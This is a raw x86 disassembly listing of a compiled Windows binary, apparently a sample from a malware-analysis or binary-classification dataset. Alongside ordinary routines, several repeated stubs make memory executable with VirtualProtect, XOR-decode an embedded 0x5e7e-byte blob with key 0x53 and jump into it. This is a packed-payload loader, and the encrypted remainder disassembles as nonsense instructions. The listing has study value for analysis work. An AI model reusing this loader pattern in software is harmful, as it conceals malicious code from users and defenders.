add eax 0x72421000
outsd
popad
arpl [ fs : ecx + 0x73 ] sp
je r-xdata
mov [ esi + 0x7c ] 0xfffffffe
mov eax esi
test bl bl
je r-xdata
outsb
popad
bound ebp [ ebp + 0x64 ]
nop
xor ecx ecx
mov dl [ eax + 0x80 ]
call sub_47a838
retn
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_47a6e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46ed0c
mov [ esi + 0x6c ] 0x2000
mov [ esi + 0x7c ] 0xfffffffe
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_47a724
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47a7d0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46eda4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_47a770
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov eax [ ebx + 0x68 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f8e4
mov [ ebx + 0x68 ] eax
mov eax [ ebx + 0x68 ]
pop esi
pop ebx
retn
xor ecx ecx
mov edx 0x2
call sub_46f4b0
mov eax ebx
mov si 0xffef
call sub_403564
sub_47a7d0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x10
jne r-xdata
mov [ esi + 0x70 ] bl
test [ esi + 0x1c ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_47a80c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x80 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x80 ] dl
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
mov eax ebx
mov si 0xffef
call sub_403564
sub_47a838
push ecx
cmp dl 0x1
cmc
sbb edx edx
mov [ esp ] edx
test ecx ecx
jne r-xdata
mov eax esp
push eax
push 0x4
mov edx 0xffff
mov eax ecx
mov ecx 0x20
call sub_46f5d0
pop edx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov ecx eax
sub_47a868
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47a88d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a894
retn
sub_47aa78
inc esi
add [ eax + 0x68ff0000 ] cl
lodsd [ esi ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
imul ebp [ esi + 0x64 ] 0x73676e69
cmp al 0x10
inc eax
je r-xdata
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x8c ] 0x0
je r-xdata
outsd
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x88 ]
call sub_419628
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ eax ] al
add [ eax ] al
mov al [ 0xffffffff980047a8 ]
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090008 ] al
outsb
push ebp
inc esp
push eax
push edx
popad
add [ fs : eax ] dl
inc eax
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
or eax 0x65726854
popad
inc ebp
jbe r-xdata
call sub_46fcec
mov ecx eax
mov dl [ ebx + 0x80 ]
mov eax ebx
call sub_47a838
inc edi
dec esi
jne r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x88 ]
or [ eax - 0x18000000 ] 0xffffffb0
0xf08bfff9 0x854e
outsb
je r-xdata
add [ eax - 0x53 ] cl
inc edi
add [ eax - 0x53 ] bh
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440b0007 ] al
popa
jne r-xdata
sub_47ab54
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x8c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebx + 0x88 ]
call sub_419628
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x90 ]
call sub_4210e0
lea eax [ ebx + 0x90 ]
call sub_40d490
xor eax eax
mov [ ebx + 0x8c ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x88 ]
call sub_46fcec
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc edi
dec esi
jne r-xdata
sub_47abbc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47a6e0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46fcb0
mov [ esi + 0x88 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_47ac08
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47a7d0
lea eax [ esi + 0x88 ]
call sub_40d490
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47a724
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_47ac64
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_47a754
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov esi [ ebx + 0x8c ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
jne r-xdata
sub_47ac90
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x8c ] 0x0
jne r-xdata
mov eax [ ebx + 0x8c ]
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x88 ]
call sub_419628
dec eax
jge r-xdata
mov eax [ ebx + 0x88 ]
call sub_419628
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x88 ]
call sub_46fc50
xor edx edx
mov eax [ ebx + 0x88 ]
call sub_46fcec
mov [ ebx + 0x8c ] eax
push ebx
mov ecx [ ebx + 0x6c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_47ad84
mov esi eax
mov [ ebx + 0x90 ] esi
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax ebx
mov si 0xffef
call sub_403564
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x88 ]
call sub_46fcec
xor ecx ecx
mov edx 0x2
call sub_46f4b0
mov edx esi
mov eax [ ebx + 0x88 ]
call sub_46fcec
call sub_46f70c
inc esi
dec edi
jne r-xdata
sub_47ad84
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_474060
mov [ edi + 0x6c ] 0x3e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ edi + 0x70 ] eax
mov [ edi + 0x74 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x78 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_47ade4
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4740f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_47ae14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b023
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_47b006
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov eax [ eax + 0x88 ]
call sub_419628
mov edx eax
mov eax [ ebp - 0x14 ]
call sub_418a5c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov eax [ eax + 0x88 ]
call sub_419628
dec eax
test eax eax
jl r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b00d
mov eax [ ebp - 0x14 ]
call sub_403368
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov eax [ eax + 0x88 ]
mov edx [ ebp - 0xc ]
call sub_46fcec
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_418744
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_4188a0
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov eax [ eax + 0x88 ]
call sub_46fc70
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x74 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
push eax
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ebx [ eax ]
call [ ebx + 0x4c ]
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46c21c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_41ad38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_46f82c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_47b034
mov eax [ ebp - 0x4 ]
call sub_4742b4
mov eax [ ebp - 0x4 ]
call sub_47b034
jmp r-xdata
xor eax eax
push ebp
push sub_47afda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4741f8
test al al
jne r-xdata
sub_47afdf
call sub_403b98
xor eax eax
push ebp
push sub_47afda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4741f8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b00d
mov eax [ ebp - 0x14 ]
call sub_403368
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_4188a0
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov eax [ eax + 0x88 ]
call sub_46fc70
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x74 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
push eax
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ebx [ eax ]
call [ ebx + 0x4c ]
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46c21c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_41ad38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_46f82c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_47b034
mov eax [ ebp - 0x4 ]
call sub_4742b4
mov eax [ ebp - 0x4 ]
call sub_47b034
jmp r-xdata
sub_47b044
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47b069
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b070
retn
sub_47b258
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b305
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_47ac44
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_4047b0
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
lea eax [ ebp - 0x8 ]
call j_sub_404630#2
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0xc ]
lea eax [ ebp - 0x8 ]
call sub_404164
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4c ]
mov eax [ ebp - 0x8 ]
call sub_404424
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b30c
lea eax [ ebp - 0x8 ]
call sub_404164
retn
lea eax [ ebp - 0x8 ]
call j_sub_404630#2
push eax
mov eax [ ebp - 0x8 ]
call sub_404424
push eax
mov ecx [ esi + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax esi
call sub_46f610
sub_47b314
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47b339
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b340
retn
sub_47b350
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x8c0047b5
mov ah 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi - 0x4b ] dh
inc edi
add [ ebx + eax ] ch
add [ eax ] al
add bh ah
inc ebp
add ah dh
sbb [ edx ] al
sub [ ebx ] dl
inc esi
add ah bl
adc al 0x46
add [ ebp + esi + 0x39480040 ] ch
inc esi
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ ebp + edx + 0x46 ] al
add ah cl
add al [ ebp ]
mov ah 0x1a
inc esi
add [ esi + ecx * 4 + 0x17040041 ] dh
inc esi
add [ eax + 0x17 ] al
inc esi
add [ eax + ebx + 0x46 ] cl
add [ ebp + ecx * 4 + 0x190c0044 ] bl
inc edx
add ah al
and [ esi ] al
in al dx
adc eax 0x5c640042
inc esi
add [ ecx + edx - 0x21fffba ] bl
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ ebp + ebx - 0xa6bffba ] ah
inc esp
add [ eax ] bl
add [ eax + eax + 0x1c ] 0x82
inc esp
add [ eax - 0x7bffb9e2 ] bl
mov dl 0x44
add [ ebp + ecx * 4 - 0x7c6bffbc ] al
inc esp
add [ eax ] dl
pop [ eax + eax - 0x74 ]
and [ esi ] al
pop eax
pop ds
inc esi
add [ eax - 0x70 ] cl
inc esp
add [ ecx ] al
inc esi
add [ eax ] cl
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax - 0x63ffbb0a ] cl
adc [ esi ] al
test al 0x27
inc esi
add [ esp + ecx * 8 + 0x44 ] dl
add [ esp + esi + 0x46 ] ch
add ah cl
aaa
inc esi
add [ eax - 0x13ffb9ca ] cl
int3
sub_47b45a
inc esp
add [ edx * 2 + 0xa900046 ] cl
inc esi
add [ eax + 0xd ] al
inc esi
add ah ch
inc ebp
inc esi
add [ eax ] ch
push ss
inc esi
add [ esi + edx + 0x58ec0046 ] ah
inc esi
add [ eax + 0x13 ] ah
inc esi
add al dh
push ebx
inc esi
add al dl
cmp al [ esi ]
movsb [ edi ] [ esi ]
push ebp
inc esi
add [ eax + 0xd004620 ] cl
add [ esi - 0x4b ] bh
inc edi
add al bh
add al [ eax ]
add [ eax ] al
add [ edi ] al
inc edx
jne r-xdata
insb
je r-xdata
add [ eax + 0x740043b9 ] dh
0xdd580043 0x42
inc ebx
popad
insb
outsb
popad
jb r-xdata
xor [ eax ] ebx
dec esp
popad
bound esp [ ebp + 0x6c ]
outsb
xor esp edi
add al [ eax ]
add [ ecx ] al
add [ ecx ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
push ebp
inc esp
push eax
push ebx
jb r-xdata
sbb al 0x3
add [ eax ] al
jo r-xdata
add [ ebx ] al
add [ eax ] al
add al [ eax ]
or [ edi + 0x72 ] eax
outsd
jne r-xdata
in al dx
jb r-xdata
inc esi
outsd
jb r-xdata
outsd
add eax [ eax ]
add [ eax ] cl
add [ esi ] cl
dec ebp
outsd
outsb
je r-xdata
or al 0x3
or [ eax ] eax
push cs
dec eax
popad
jb r-xdata
inc edx
outsd
js r-xdata
nop
nop
push r-xdata
call sub_47b5d4
retn
lea eax [ ebp - 0x8 ]
push eax
push 0x40
in al 0x4a
inc ebp
add [ eax ] dl
add [ ebp ] 0x6c
retn 0x43
sub [ ebx ] al
add [ eax ] al
or al 0x0
or eax 0x4e4e6449
push esp
push eax
push ebx
jb r-xdata
push 0x5e7d
push ebx
call VirtualProtect
nop
nop
xor eax eax
xor [ 0x43db7c00 ] ecx
add [ eax - 0x31 ] dh
inc ebx
enter 0x47b0 0x0
add al 0x77
outsd
insb
xor [ eax ] esp
add eax [ eax ]
add [ edx ] cl
add [ eax ] cl
push esp
outsd
outsd
insb
inc edx
popad
jb r-xdata
je r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x31031
add [ esi ] al
add [ edx ] cl
push eax
outsd
jo r-xdata
add al 0x3
add [ eax ] al
add eax [ eax ]
or dl [ ebx + 0x63 ]
jb r-xdata
lea edx [ eax + ebx ]
mov dl [ edx ]
nop
nop
xor dl 0x53
lea ecx [ eax + ebx ]
mov [ ecx ] dl
inc eax
cmp eax 0x5e7e
jne r-xdata
add ebx 0x3808
mov [ ebp - 0x4 ] ebx
nop
nop
jmp [ ebp - 0x4 ]
jb r-xdata
retn
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
nop
test ebx ebx
je r-xdata
xor [ eax + 0x480047b3 ] ebx
call 0xa5b60f
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
and al 0x3
add [ eax ] al
or eax [ eax ]
adc [ ecx + 0x64 ] cl
push ecx
jb r-xdata
jb r-xdata
jo r-xdata
insb
insb
inc edx
popad
jb r-xdata
inc edi
add [ eax + 0x70047b5 ] bh
push es
push esp
inc esi
outsd
sub al 0x16
inc ebx
add al cl
mov al 0x47
add [ edi + esi * 2 ] al
push es
push esp
outsd
add [ ebx ] cl
add [ eax ] dl
dec ecx
push ecx
outsb
jne r-xdata
add [ eax ] al
add eax 0x63410b00
je r-xdata
or [ ebx ] al
add [ eax ] al
add al 0x0
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + eax ] ecx
outsb
je r-xdata
adc al 0x3
add [ eax ] al
pop es
add [ esi ] al
sub_47b5a0
push 0x74004327
add eax [ ebx ]
sub al 0x16
inc ebx
add al cl
mov al 0x47
add [ edi + esi * 2 ] al
inc edi
add [ eax + 0x70047b5 ] bh
push es
push esp
inc esi
outsd
jb r-xdata
retn
xor [ eax + 0x480047b3 ] ebx
call 0xa5b60f
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
nop
test ebx ebx
je r-xdata
nop
nop
push r-xdata
call sub_47b5d4
retn
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5e7d
push ebx
call VirtualProtect
nop
nop
xor eax eax
lea edx [ eax + ebx ]
mov dl [ edx ]
nop
nop
xor dl 0x53
lea ecx [ eax + ebx ]
mov [ ecx ] dl
inc eax
cmp eax 0x5e7e
jne r-xdata
add ebx 0x3808
mov [ ebp - 0x4 ] ebx
nop
nop
jmp [ ebp - 0x4 ]
sub_47b5d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
nop
test ebx ebx
je r-xdata
nop
nop
push r-xdata
call sub_47b5d4
retn
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5e7d
push ebx
call VirtualProtect
nop
nop
xor eax eax
lea edx [ eax + ebx ]
mov dl [ edx ]
nop
nop
xor dl 0x53
lea ecx [ eax + ebx ]
mov [ ecx ] dl
inc eax
cmp eax 0x5e7e
jne r-xdata
add ebx 0x3808
mov [ ebp - 0x4 ] ebx
nop
nop
jmp [ ebp - 0x4 ]
sub_47b770
pop esp
salc
xchg [ ebx + 0x53 ] dl
push ebx
mov edx 0x53534d6a
lodsb [ esi ]
lds esi [ edi + 0x3b535353 ]
adc [ ebx + edx * 2 + 0x53 ] 0xffffffac
add eax 0xefd6de5b
test eax 0xac03acac
add eax 0x21eba7f
push ebx
push ebx
retn
sub_47b7ed
fcomp st6
fwait
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add ebx esi
salc
out 0xab eax
lodsb [ esi ]
lodsb [ esi ]
add ebx esi
push ss
mov edi 0x97d6de03
scasd [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add ebp [ ebp + eax * 8 + 0x535353bf ]
fcomp st6
xchg edi eax
scasd [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add edi [ ebx + 0x5353448d ]
adc eax [ ebx ]
fcomp st6
xchg edi eax
scasd [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add edi [ edx + 0x53536acc ]
retn
sub_47b97c
pop esp
xlat
xchg edx eax
dec ebp
push ebx
push ebx
pushad
lodsb [ esi ]
mov edx 0x535303ed
fcomp st6
mov edi 0x3acacae
mov edx 0x53536911
retn
sub_47b9a2
or al 0x8
0xc3c3c390 0xac3
salc
xchg ebx eax
pop esp
xlat
push edi
push ebx
push ebx
push ebx
add ebp [ ebp + eax + 0x302ba5b ]
push ebx
push ebx
retn
sub_47ba47
add dh bl
salc
out dx eax
test eax 0xba03acac
pop esi
push bx
push ebx
rcl [ edx + 0x30ba51 ] 0x1
push ebx
push ebx
cmp [ esi ] esp
xor eax 0x9bf06da
mov edx 0x53536c7a
retn
sub_47ba92
or edi [ ecx ]
sub ebx eax
mov [ 0xffffffffb126da35 ] eax
or eax 0xda358dd8
push cs
mov bh 0x39
xor al 0xba
out dx eax
pop eax
push ebx
push ebx
fcom [ edi ]
ja r-xdata
push es
fdivr [ edi + 0x60040202 ]
lodsb [ esi ]
add al 0x39
push edi
mov edx 0x5353629c
retn
mov ebx 0x53531b15
or cl [ edx ]
mov edx 0x5353529c
retn
sub_47bb54
add [ ebx ] al
mov ebx 0x5353436f
rcl [ edi - 0x78e921a1 ] 0x1
add ebp [ ebp - 0x78f125fd ]
lodsb [ esi ]
cmpsd [ es : esi ] [ edi ]
mov edx 0x5353694a
add al 0xda
aad 0xdf
push ebx
push ebx
push ebx
mov ebx 0x5353580b
cmp esi [ ecx + 0x40b0adc ]
fcmovbe st5

sub_47bc10
lodsb [ esi ]
les edi [ ebx - 0x21acacad ]
push ss
xchg ebx eax
add edi [ edx + 0x53534266 ]
push 0x28
jpo r-xdata
imul edx [ ebx + 0x53 ] 0xffffffc3
retn
salc
out 0x3 al
push ebx
push ebx
mov ebx 0x5353595a
salc
xchg ebx eax
pop esp
salc
pop esi
push ebx
push ebx
push ebx
mov ebx 0x535300ba
salc
xchg ebx eax
pop esp
xlat
std
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
mov edx 0x53534fa2
retn
sub_47bc88
cmp edx [ ebx - 0x2d ]
push ebx
push ebx
cmp [ ebx - 0x46 ] edx
cwde
push ebx
push ebx
pop esp
aam 0xb5
jne r-xdata
retn
push ebx
mov edx 0x53536cab
fsubr [ ebp - 0x68d125cb ]
cmp [ 0xffffffffda35abd8 ] eax
xchg ebp eax
fsubr [ ebp - 0x64d125cb ]
pushad
lodsb [ esi ]
mov edx 0x535347e7
retn
sub_47bd7d
pop esp
salc
rol [ ebp + 0x53 ] 0x1
push ebx
fisubr [ esi ]
mov ebx 0xaee3dede
lodsb [ esi ]
lodsb [ esi ]
mov ebx 0x53535104
salc
xchg ebx eax
mov edx 0x535305c6
retn
sub_47bd99
rcl [ edi + 0x7737d05f ] 0x1
dec ebx
push ebx
shr [ edi + edx * 2 ] cl
push ebx
pop esp
aad 0xde
dec esi
push ebx
push ebx
shl [ edi ] 0x1
ja r-xdata
push ebx
push ebx
pop esp
shl [ ebp + 0x73 ] 0x1
push ebx
push ebx
ficom [ edi ]
ja r-xdata
jae r-xdata
add edi [ edx + 0x53531644 ]
retn
test eax 0xc3c3acac
retn
push ebx
mov edx 0xacacadcb
retn
sub_47bdbd
push 0x2f
ja r-xdata
fwait
imul edx [ ebx + 0x53 ] 0x7375d15c
push ebx
push ebx
mov edx 0xacacadcb
retn
pop esp
xlat
push esi
push ebx
push ebx
push ebx
mov ebx 0x5353617a
fisubr [ edi ]
ja r-xdata
fcomp [ ebx - 0x512c2922 ]
lodsb [ esi ]
lodsb [ esi ]
mov ebx 0x53537f3a
ficom [ esi ]
mov bh 0xba
shr [ edi ] 0x1
ja r-xdata
fcom [ ebp + 0x534e9fba ]
push ebx
push edx
lodsb [ esi ]
and [ ebx - 0x28 ] ah
lodsd [ esi ]
lodsb [ esi ]
daa
ja r-xdata
retn
mov edx 0x53534e9f
pop esp
salc
jg r-xdata
mov ebx 0x5353152d
mov edx 0x53530274
retn
push ebx
push ebx
sub_47bdfa
fcom [ edi ]
ja r-xdata
imul eax [ ebx ] 0x5c
in eax 0x10
dec ebp
add ebp [ eax - 0x456a27f5 ]
lahf
dec esi
push ebx
push ebx
retn
mov edx 0xacacad86
retn
sub_47be0b
push 0xbdd75c90
push es
push ebx
push ebx
fcomp [ ebx - 0x512c2922 ]
lodsb [ esi ]
lodsb [ esi ]
mov ebx 0x53537f3a
ficom [ esi ]
mov bh 0xba
fwait
imul edx [ ebx + 0x53 ] 0x7375d15c
push ebx
push ebx
mov edx 0xacacadcb
retn
sub_47be40
pop esp
xlat
xchg ebx eax
lodsd [ esi ]
lodsb [ esi ]
lodsb [ esi ]
pop esp
in eax 0x10
imul eax [ ebx ] 0x5c
in eax 0x10
dec ebp
add ebp [ eax - 0x456a27f5 ]
lahf
dec esi
push ebx
push ebx
retn
sub_47be8c
push es
fdivr [ edi + 0x5743bfd2 ]
push ebx
push ebx
salc
0x6d20d75c 0x5353
mov edx 0x5353613b
pop esp
salc
inc ecx
push eax
push ebx
push ebx
mov edx 0x53531e13
add edi [ edx + 0x53537e3d ]
retn
sub_47bebf
rcl [ edi + 0x772fda5f ] 0x1
inc edi
add eax 0x531e84bb
